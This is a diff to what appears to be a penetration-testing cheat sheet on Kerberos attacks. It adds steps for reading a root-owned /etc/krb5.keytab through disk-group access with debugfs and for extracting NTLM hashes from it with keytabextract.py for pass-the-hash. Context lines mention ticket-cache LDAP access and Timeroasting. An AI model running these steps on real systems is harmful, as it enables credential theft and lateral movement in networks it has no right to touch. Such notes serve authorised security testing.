@@ -223,6 +223,10 @@ kinit -kt /etc/krb5.keytab '<Principal>@<REALM>'
 export KRB5CCNAME=/tmp/krb5cc_0
 nxc ldap <DC_FQDN> -u <principal> -k --use-kcache
 ```
+If `root` owns the keytab and you can't read it directly but you're in the `disk` group (raw block device read — see the Linux privesc note), pull it straight off the filesystem via `debugfs` instead. Either way, you can also extract the principal's NTLM hash straight from the keytab for pass-the-hash elsewhere, without needing a TGT at all:
+```bash
+./keytabextract.py /path/to/krb5.keytab    # https://github.com/sosdave/KeyTabExtract — prints the NT hash per principal
+```
 
 Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
 ```bash
